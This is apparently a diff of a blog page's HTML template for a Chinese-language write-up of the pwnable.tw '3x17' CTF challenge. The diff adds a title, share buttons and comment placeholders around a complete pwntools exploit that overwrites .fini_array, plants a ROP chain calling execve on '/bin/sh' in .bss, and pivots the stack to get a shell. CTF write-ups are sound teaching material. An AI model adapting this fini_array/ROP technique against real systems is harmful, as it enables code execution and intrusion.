@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>WELCOME</title>
+    <title>pwnable tw 3x17 writeup | WELCOME</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
@@ -51,15 +51,14 @@
 </div>
 
   <div id='main-part'>
-      
-    <div class="main">
+      <div class="main">
 <div class="blog-post">
     <!-- Title -->
-    
-      <h1 class="blog-post-title">
-        <a href="/2021/11/13/pwnable-tw-3x17-writeup/">Pwnable Tw 3x17 Writeup</a>
-      </h1>
-    
+    <h1 class="blog-post-title">
+        <a href="/2021/11/13/pwnable-tw-3x17-writeup/">
+            Pwnable Tw 3x17 Writeup
+        </a>
+    </h1>
     <!-- Date and Author -->
     <p class="blog-post-meta">
         2021-11-13
@@ -99,11 +98,33 @@
 
 <p>##exploit<br> 直接组合起来即可getshell</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造fini_array，使得程序可以无限次进入main函数</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">fini_array= <span class="number">0x4B40F0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(fini_addr) + p64(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造ROP链</span></span><br><span class="line">prdi = <span class="number">0x401696</span></span><br><span class="line">pdxsi= <span class="number">0x44a309</span></span><br><span class="line">prax = <span class="number">0x41e4af</span></span><br><span class="line">sysc = <span class="number">0x4022b4</span></span><br><span class="line">bufad= <span class="number">0x4B9300</span>		<span class="comment">#到.bss段随便找个位置放&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bufda= <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x10</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(pdxsi))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x18</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x28</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prdi) + p64(bufad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x38</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prax) + p64(<span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x48</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(sysc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(bufad).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(bufda)</span><br><span class="line"><span class="comment">#调整rbp，rsp，getshell</span></span><br><span class="line">leaveret = <span class="number">0x401c4b</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(leaveret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-    <!-- Only display the Read More link if we are displaying an excerpt -->
+
+    <!-- Social share choices -->
     
+  <div id="social-share">
+    <a data-url="http://example.com/2021/11/13/pwnable-tw-3x17-writeup/" target="_blank" rel="noopener" href="https://plus.google.com/share?url=" class="googleplus"><img src="/image/googleplusicon.png" alt=""/></a>
+    <a data-url="http://example.com/2021/11/13/pwnable-tw-3x17-writeup/" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?url=" class="twitter"><img src="/image/twittericon.png" alt=""/></a>
+    <a data-url="http://example.com/2021/11/13/pwnable-tw-3x17-writeup/" target="_blank" rel="noopener" href="http://pinterest.com/pin/create/button/?url=" class="pinterest"><img src="/image/pinteresticon.png" alt=""/></a>
+    <a data-url="http://example.com/2021/11/13/pwnable-tw-3x17-writeup/" target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=" class="facebook"><img src="/image/facebookicon.png" alt=""/></a>
+  </div>
+
+
+
+
+
+<!--
+
+
+https://www.facebook.com/sharer/sharer.php?u=http://example.com/2021/11/13/pwnable-tw-3x17-writeup/
+http://example.com/2021/11/13/pwnable-tw-3x17-writeup/
+-->
+
+
 
     <hr />
 
+
+    <!-- Tags and Categories links -->
     
 
     
@@ -116,13 +137,11 @@
 
 
 
+    <!-- Comment using disqus -->
+    
 
 </div>
 </div>
-
-
-
-
 
 
   </div>
